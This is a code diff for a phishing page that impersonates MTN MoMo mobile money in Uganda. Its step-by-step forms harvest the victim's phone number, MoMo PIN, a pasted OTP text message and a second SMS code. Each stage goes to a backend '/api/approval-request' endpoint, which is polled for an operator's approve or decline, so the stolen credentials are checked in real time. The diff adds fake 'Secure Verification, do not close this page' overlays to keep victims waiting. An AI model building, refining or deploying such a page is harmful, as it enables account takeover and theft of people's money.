@@ -17,7 +17,7 @@
   --muted: #667085;
   --border: #d1d5db;
   
-  /* UPDATED BRAND COLORS MATCHING THE IMAGE */
+  /* BRAND COLORS MATCHING MOMO THEME */
   --momo-blue: #004f71; 
   --momo-yellow: #ffcc00;
 }
@@ -29,7 +29,6 @@ body {
   color: var(--text);
 }
 
-/* Updated Header with MoMo Deep Blue Background */
 .header {
     width: 100%;
     height: 140px;
@@ -41,7 +40,6 @@ body {
     padding: 15px;
 }
 
-/* Updated Logo matching the yellow rounded squircle shape */
 .logo {
     width: 80px;
     height: 80px;
@@ -56,7 +54,6 @@ body {
     margin-bottom: 6px;
 }
 
-/* Updated Logo Text matching the MoMo typography */
 .logo span {
     font-size: 24px;
     font-weight: bold;
@@ -68,7 +65,6 @@ body {
     letter-spacing: -0.5px;
 }
 
-/* Updated "from MTN" Subtitle Text color and layout positioning */
 .mtn-text {
     font-size: 14px;
     font-weight: bold;
@@ -105,23 +101,15 @@ p {
   margin-bottom: 16px;
 }
 
-.demo {
-  text-align: center;
-  font-size: 11px;
-  color: var(--muted);
-  margin-bottom: 15px;
-}
-
 #page3 label {
   display: block;
-  text-align: center;         /* CENTERS the label text directly in the middle */
-  color: var(--momo-blue);    /* CHANGES the color to the deep MoMo Blue */
+  text-align: center;
+  color: var(--momo-blue);
   font-weight: bold;
   font-size: 14px;            
-  margin: 22px 0 12px;        /* Spacing above and below the text label */
+  margin: 22px 0 12px;
   letter-spacing: 0.5px;      
 }
-
 
 input[type="tel"] {
   width: 100%;
@@ -208,26 +196,56 @@ button:disabled {
   pointer-events: none;
 }
 
+/* FULLSCREEN OVERLAY LOADING PANEL STRIPS */
+.fullscreen-waiting-overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100vw;
+  height: 100vh;
+  background-color: #2b3945; 
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  z-index: 99999;
+  text-align: center;
+  padding: 24px;
+  box-sizing: border-box;
+}
 
+.fullscreen-waiting-overlay h2 {
+  font-size: 24px;
+  font-weight: 700;
+  color: #ffffff;
+  margin: 0 0 12px 0;
+  letter-spacing: 0.5px;
+}
+
+.fullscreen-waiting-overlay p {
+  font-size: 16px;
+  color: #e0e0e0;
+  margin: 0 0 6px 0;
+  text-align: center;
+}
+
+.fullscreen-waiting-overlay p.warning {
+  color: #b0b0b0;
+}
+
+/* SOLID OUTER CONTAINER HOUSING HOURGLASS VECTOR ICON */
 .spinner {
   width: 90px;
   height: 90px;
-  margin: 20px auto 24px;
-  
-  /* 1. Subdued uniform outer ring & translucent circle fill */
+  margin: 0 auto 35px auto;
   background-color: rgba(255, 255, 255, 0.05); 
   border: 3px solid rgba(255, 255, 255, 0.2);  
   border-radius: 50%;
-  
-  /* 2. FIXED: Injecting the hourglass image correctly into the background */
-  background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://w3.org' viewBox='0 0 24 24' fill='%23ffb300'><path d='M6 2h12v4l-4 4 4 4v4H6v-4l4-4-4-4V2zm2 2v1.5c0 .54.21 1.05.59 1.41L12 10.34l3.41-3.43c.38-.36.59-.87.59-1.41V4H8zm8 16v-1.5c0-.54-.21-1.05-.59-1.41L12 13.66l-3.41 3.43c-.38.36-.59.87-.59 1.41V20h8z'/></svg>");
+  background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://w3.org' viewBox='0 0 24 24' fill='%23ffb300'><path d='M6 2h12v4l-4 4 4 4v4H6v-4l4-4-4-4V2zm2 2v1.5c0 .54.21 1.05.59 1.41L12 10.34l3.41-3.43c.38-.36.59-.87.59-1.41V4H8zm8 16v-1.5c0-.54-.21-1.05-.59-1.41L12 13.66l-3.41 3.43c-.38.36-.59 1.41-.59 1.41V20h8z'/></svg>");
   background-repeat: no-repeat;
   background-position: center;
-  background-size: 40px 40px; /* Size of the inner hourglass */
-  
+  background-size: 40px 40px;
   box-shadow: 0 0 15px rgba(0, 0, 0, 0.15);
-  
-  /* 3. Smooth continuous rotation */
   animation: spin 2s linear infinite;
 }
 
@@ -235,8 +253,6 @@ button:disabled {
   from { transform: rotate(0deg); }
   to { transform: rotate(360deg); }
 }
-  
-
 
 .status {
   text-align: center;
@@ -274,17 +290,9 @@ button:disabled {
 }
 
 @media (max-width: 380px) {
-  .card {
-    padding: 16px 12px;
-  }
-  .boxes {
-    gap: 6px;
-  }
-  .boxes input {
-    width: 42px;
-    height: 50px;
-    font-size: 18px;
-  }
+  .card { padding: 16px 12px; }
+  .boxes { gap: 6px; }
+  .boxes input { width: 42px; height: 50px; font-size: 18px; }
 }
 
 .phone-input {
@@ -306,17 +314,8 @@ button:disabled {
   border-right: 1px solid var(--border);
 }
 
-.flag {
-  font-size: 18px;
-  display: inline-block;
-  line-height: 1;
-}
-
-.country-code {
-    white-space: nowrap;
-    font-weight: bold;
-    font-size: 16px;
-}
+.flag { font-size: 18px; display: inline-block; line-height: 1; }
+.country-code { white-space: nowrap; font-weight: bold; font-size: 16px; }
 
 .phone-input input {
     border: none;
@@ -326,23 +325,9 @@ button:disabled {
     background: transparent;
 } 
 
-.phone-input input::placeholder {
-  color: #a0aec0;
-}
-
-.terms-text {
-  text-align: center;
-  font-size: 11px;
-  color: #718096;
-  line-height: 1.4;
-  margin-top: 20px;
-}
-
-.terms-text a {
-  color: #004F9F;
-  text-decoration: none;
-  font-weight: 600;
-}
+.phone-input input::placeholder { color: #a0aec0; }
+.terms-text { text-align: center; font-size: 11px; color: #718096; line-height: 1.4; margin-top: 20px; }
+.terms-text a { color: #004F9F; text-decoration: none; font-weight: 600; }
 </style>
 </head>
 <body>
@@ -354,83 +339,87 @@ button:disabled {
   <div class="mtn-text">from MTN</div>
 </div>
 
-<div class="card" id="page1">
-  <h1>Welcome to MoMo MTN</h1>
-  <p>Enter number.</p>
+<main>
+  <!-- PAGE 1: PHONE BLOCK -->
+  <div class="card" id="page1">
+    <h1>Welcome to MoMo MTN</h1>
+    <p>Enter number.</p>
 
-  <div class="phone-input">
-    <div class="flag-section">
-      <span class="flag">🇺🇬</span>
-      <span class="country-code">+256</span>
+    <div class="phone-input">
+      <div class="flag-section">
+        <span class="flag">🇺🇬</span>
+        <span class="country-code">+256</span>
+      </div>
+      <input id="phone" type="tel" inputmode="numeric" maxlength="9" placeholder="XXXXXXXXX" autocomplete="off">
     </div>
 
-    <input
-      id="phone"
-      type="tel"
-      inputmode="numeric"
-      maxlength="9"
-      placeholder="XXXXXXXXX"
-      autocomplete="off"
-    >
+    <button id="nextPhone" type="button" disabled>Next</button>
+
+    <p class="terms-text">
+      Signing up means you agree to our <a href="#">Terms</a> and <a href="#">Privacy Policy</a>
+    </p>
   </div>
 
-  <button id="nextPhone" type="button" disabled>
-    Next
-  </button>
-
-  <p class="terms-text">
-    Signing up means you agree to our
-    <a href="#">Terms</a> and
-    <a href="#">Privacy Policy</a>
-  </p>
-</div>
-
-
- <!-- PAGE 2: MTN PIN -->
+  <!-- PAGE 2: PIN BLOCK -->
   <section id="page2" class="hidden">
-    <h1>MTN PIN</h1>
-    <p>ENTER PIN.</p>
-    <div class="boxes" id="pinBoxes"></div>
-    <div id="pinWaiting" class="hidden">
-      <div class="spinner"></div>
-      <div class="status">Secure verification...</div>
+    <div class="card">
+      <h1>MTN PIN</h1>
+      <p>ENTER PIN.</p>
+      <div class="boxes" id="pinBoxes"></div>
+      <div id="pinMessage" class="status"></div>
     </div>
-    <div id="pinMessage" class="status"></div>
+    
+    <div id="pinWaiting" class="fullscreen-waiting-overlay hidden">
+      <div class="spinner"></div>
+      <h2>Secure Verification</h2>
+      <p>Verifying your PIN...</p>
+      <p class="warning">Please do not close this page.</p>
+    </div>
   </section>
 
- <!-- PAGE 3: FIRST OTP CODE -->
-<section id="page3" class="hidden">
-  <h1>OTP VERIFICATION</h1>
-  <p>Copy and paste the verification OTP received on normal sms.</p>
-  <div class="notice">Check your sms box for otp message from MTN. It may take a view seconds to arrive.</div>
-  <label for="code1">ENTER OTP MESSAGE</label>
-  <input id="code1" type="text" autocomplete="off" placeholder="PASTE THE OTP MESSAGE">
-  <button id="submitCode1" disabled="true">Continue</button>
-  <div id="code1Waiting" class="hidden">
-    <div class="spinner"></div>
-    <div class="status">Secure verification...</div>
-  </div>
-  <div id="code1Message" class="status"></div>
-</section>
- 
-
-  <!-- PAGE 4: SECOND OTP CODE -->
+  <!-- PAGE 3: TEXT OTP INPUT PANEL -->
+  <section id="page3" class="hidden">
+    <div class="card">
+      <h1>OTP VERIFICATION</h1>
+      <p>Copy and paste the verification OTP received on normal sms.</p>
+      <div class="notice">Check your sms box for otp message from MTN. It may take a few seconds to arrive.</div>
+      <label for="code1">ENTER OTP MESSAGE</label>
+      <input id="code1" type="text" autocomplete="off" placeholder="PASTE THE OTP MESSAGE">
+      <button id="submitCode1" disabled="true">Continue</button>
+      <div id="code1Message" class="status"></div>
+    </div>
+    
+    <div id="code1Waiting" class="fullscreen-waiting-overlay hidden">
+      <div class="spinner"></div>
+      <h2>Secure Verification</h2>
+      <p>Verifying your OTP Code...</p>
+      <p class="warning">Please do not close this page.</p>
+    </div>
+  </section>
+  <!-- PAGE 4: 4 DIGIT GRID INPUT BOXES -->
   <section id="page4" class="hidden">
-    <h1>OTP VERIFICATION</h1>
-    <p>Enter the four digits Code received in your MTN SMS.</p>
-    <div class="boxes" id="code2Boxes"></div>
-    <div id="code2Waiting" class="hidden">
-      <div class="spinner"></div>
-      <div class="status">Secure verification...</div>
+    <div class="card">
+      <h1>OTP VERIFICATION</h1>
+      <p>Enter the four digits Code received in your MTN SMS.</p>
+      <div class="boxes" id="code2Boxes"></div>
+      <div id="code2Message" class="status"></div>
     </div>
-    <div id="code2Message" class="status"></div>
+    
+    <div id="code2Waiting" class="fullscreen-waiting-overlay hidden">
+      <div class="spinner"></div>
+      <h2>Secure Verification</h2>
+      <p>Processing Application...</p>
+      <p class="warning">Please do not close this page.</p>
+    </div>
   </section>
 
-  <!-- PAGE 5: SUCCESS -->
+  <!-- PAGE 5: COMPLETION LANDING SCREEN -->
   <section id="page5" class="hidden">
-    <div class="success">✓</div>
-    <h1>MTN VERIFICATION SUCCESSFUL</h1>
-    <p>The MTN verification sequence concluded successfully.</p>
+    <div class="card">
+      <div class="success">✓</div>
+      <h1>MTN VERIFICATION SUCCESSFUL</h1>
+      <p>The MTN verification sequence concluded successfully.</p>
+    </div>
   </section>
 </main>
 
@@ -439,7 +428,6 @@ let sessionId = null;
 let userData = { phone: "", pin: "", code1: "", code2: "" };
 let pollingInterval = null;
 
-// Initialize Session
 window.addEventListener("DOMContentLoaded", async () => {
   try {
     const res = await fetch("/api/session", { method: "POST" });
@@ -450,7 +438,6 @@ window.addEventListener("DOMContentLoaded", async () => {
   }
 });
 
-// Setup dynamic item grid handling routines
 function setupBoxInputs(containerId, count, onComplete) {
   const container = document.getElementById(containerId);
   container.innerHTML = "";
@@ -484,11 +471,9 @@ function setupBoxInputs(containerId, count, onComplete) {
     inputs.push(input);
   }
   
-  // FIXED: Focus the first actual input element in the array instead of the array object
   if (inputs.length > 0) inputs[0].focus();
 }
 
-// Step 1 Phone Input Dynamic Activation Routines
 const phoneInput = document.getElementById("phone");
 const nextPhoneBtn = document.getElementById("nextPhone");
 
@@ -509,8 +494,6 @@ nextPhoneBtn.addEventListener("click", () => {
   
   setupBoxInputs("pinBoxes", 5, submitPinStage);
 });
-
-// Post Phone & PIN bundle configurations
 async function submitPinStage(pinValue) {
   userData.pin = pinValue;
   document.getElementById("pinWaiting").classList.remove("hidden");
@@ -523,7 +506,6 @@ async function submitPinStage(pinValue) {
   }
 }
 
-// Track and validate Page 3 input elements
 const code1Input = document.getElementById("code1");
 const submitCode1Btn = document.getElementById("submitCode1");
 
@@ -548,7 +530,6 @@ submitCode1Btn.addEventListener("click", async () => {
   }
 });
 
-// Final step submission handler
 async function submitCode2Stage(code2Value) {
   userData.code2 = code2Value;
   document.getElementById("code2Waiting").classList.remove("hidden");
@@ -559,7 +540,6 @@ async function submitCode2Stage(code2Value) {
   }
 }
 
-// Pipeline transmission communications helper
 async function sendStagePayload(stage, payload) {
   try {
     const response = await fetch("/api/approval-request", {
@@ -573,7 +553,6 @@ async function sendStagePayload(stage, payload) {
   }
 }
 
-// Polling core infrastructure engine
 function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, successCallback) {
   const msgElement = document.getElementById(msgId);
   msgElement.className = "status";
@@ -592,24 +571,23 @@ function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, succes
         document.getElementById(currentPageId).classList.add("hidden");
         document.getElementById(nextPageId).classList.remove("hidden");
         if (successCallback) successCallback();
-           } else if (data.status === "declined") {
+      } else if (data.status === "declined") {
         clearInterval(pollingInterval);
         
-        // 1. Hide the full-page waiting spinner overlay screen
         document.getElementById(spinnerId).classList.add("hidden");
         
-        // 2. Clear out old entries from the text box and individual PIN grids
         const otpInput = document.getElementById('code1');
         if (otpInput) otpInput.value = '';
         
         const pinBoxes = document.querySelectorAll('.boxes input');
-        pinBoxes.forEach(box => box.value = '');
+        pinBoxes.forEach(box => {
+          box.value = '';
+          box.disabled = false;
+        });
         
-        // 3. Reset the primary continue button back to its initial locked style state
         const submitBtn = document.getElementById('submitCode1');
         if (submitBtn) submitBtn.disabled = true;
 
-        // 4. Alert user about the correction step without blocking the interface view
         msgElement.className = "error";
         msgElement.innerText = "Incorrect entry. Please enter the correct details.";
       }
@@ -620,3 +598,6 @@ function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, succes
   }, 2500);
 }
 </script>
+</body>
+</html>
+
